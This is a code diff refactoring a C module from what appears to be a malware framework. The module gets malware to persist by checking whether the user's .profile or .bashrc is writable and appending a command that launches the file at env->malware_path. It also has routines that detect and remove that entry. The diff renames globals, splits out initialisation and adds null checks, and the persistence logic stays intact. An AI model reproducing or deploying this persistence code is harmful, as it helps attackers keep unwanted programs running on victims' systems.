@@ -5,7 +5,7 @@
 	#include <string.h>
 	#include "../../headers/modules/module.h"
 	#include "../../headers/helpers/helpers.h"
-	#include "../../headers/errors.h"
+	#include "../../headers/errors/codes.h"
 
 #pragma endregion
 
@@ -21,46 +21,30 @@
 
 #pragma region GlobalVariables
 
-	char *checked_files[CHECKED_FILES_COUNT];
 	char *home_path = NULL;
-	int exploitable_file_index = -1;
+	char *checked_files[CHECKED_FILES_COUNT] = {NULL};
+	int exploitable_index = -1;
 
 #pragma endregion
 
-#pragma region SharedObjectEvents
+#pragma region GlobalVariablesMethods
 
-void __attribute__ ((constructor)) on_dlopen(void){
+int are_globals_inited(){
 
-	get_user_home_directory(&home_path);
-
-	// Generate all checked files
-	concat_path_with_filename(checked_files + __COUNTER__, home_path, PROFILE_PATH);
-	concat_path_with_filename(checked_files + __COUNTER__, home_path, BASH_RC);
-
-}
-
-void __attribute__ ((destructor)) on_dlclose(void){
-
-	int i;
-
-	free(home_path);
-	for (i = 0; i < CHECKED_FILES_COUNT; i++){
-		free(checked_files[i]);
-	}
+	if (home_path == NULL || checked_files[0] == NULL)
+		return 0;
+	else
+		return 1;
 
 }
 
-#pragma endregion
-
-#pragma region ModuleMethods
-
-extern int is_compatible(ENVIRONMENT *env){
+int init_exploitable_index(ENVIRONMENT *env){
 
 	int i, ret_val;
 
 	// If root, then the exploit can be executed
 	if (env->is_root){
-		exploitable_file_index = 0;
+		exploitable_index = 0;
 		return 1;
 	}
 
@@ -69,7 +53,7 @@ extern int is_compatible(ENVIRONMENT *env){
 		// Check the privileges for the current file
 		ret_val = has_privilege(checked_files[i], WRITE);
 		if (ret_val >= 0){
-			exploitable_file_index = i;
+			exploitable_index = i;
 			break;
 		}
 
@@ -80,16 +64,63 @@ extern int is_compatible(ENVIRONMENT *env){
 
 }
 
+int init_globals(){
+
+	get_user_home_directory(&home_path);
+
+	// Generate all checked files
+	concat_path_with_filename(checked_files + __COUNTER__, home_path, PROFILE_PATH);
+	concat_path_with_filename(checked_files + __COUNTER__, home_path, BASH_RC);
+
+	// Return
+	return 0;
+
+}
+
+#pragma endregion
+
+#pragma region SharedObjectEvents
+
+void __attribute__ ((constructor)) on_dlopen(void){
+
+	init_globals();
+
+}
+
+void __attribute__ ((destructor)) on_dlclose(void){
+
+	int i;
+
+	free(home_path);
+	for (i = 0; i < CHECKED_FILES_COUNT; i++){
+		if (checked_files[i] != NULL)
+			free(checked_files[i]);
+	}
+
+}
+
+#pragma endregion
+
+#pragma region ModuleMethods
+
+extern int is_compatible(ENVIRONMENT *env){
+
+	return init_exploitable_index(env);
+
+}
+
 extern int exploit(ENVIRONMENT *env){
 
 	FILE *opened_file;
 
 	// If the vulnerable file is not setted yet, set it
-	if (exploitable_file_index == -1)
-		is_compatible(env);
+	if (exploitable_index == -1)
+		init_exploitable_index(env);
 
-	// Apend the run command to file
-	opened_file = fopen(checked_files[exploitable_file_index], "a");
+	// Append the run command to file
+	opened_file = fopen(checked_files[exploitable_index], "a");
+	if (opened_file == NULL)
+		return ERROR_OPERATING_SYSTEM_UNABLE_TO_OPEN_FILE;
 	fprintf(opened_file, RUN_COMMAND_FORMAT, env->malware_path);
 	fclose(opened_file);
 
@@ -104,10 +135,10 @@ extern int is_installed(ENVIRONMENT *env){
 	int ret_val = 0;
 
 	// If the vulnerable file is not setted yet, set it
-	if (exploitable_file_index == -1)
-		is_compatible(env);
+	if (exploitable_index == -1)
+		init_exploitable_index(env);
 
-	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){
+	if (get_file_content(checked_files[exploitable_index], &content) >= 0){
 
 		// Check if the run command is present in file
 		if (strstr(content, env->malware_path) != NULL){
@@ -129,19 +160,19 @@ extern int delete_installed(ENVIRONMENT *env){
 	char *content = NULL;
 
 	// If the vulnerable file is not setted yet, set it
-	if (exploitable_file_index == -1)
-		is_compatible(env);
+	if (exploitable_index == -1)
+		init_exploitable_index(env);
 
-	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){
+	// Get file content
+	get_file_content(checked_files[exploitable_index], &content);
 
-		// Remove all occurences of the run command from the file
-		remove_all_substring_occurences(content, env->malware_path);
-		create_file(checked_files[exploitable_file_index], content);
+	// Remove all occurences of the run command from the file
+	remove_all_substring_occurences(content, env->malware_path);
+	create_file(checked_files[exploitable_index], content);
 
-		free(content);
-		content = NULL;
-
-	}
+	// Free the content
+	free(content);
+	content = NULL;
 
 	// Return
 	return 0;
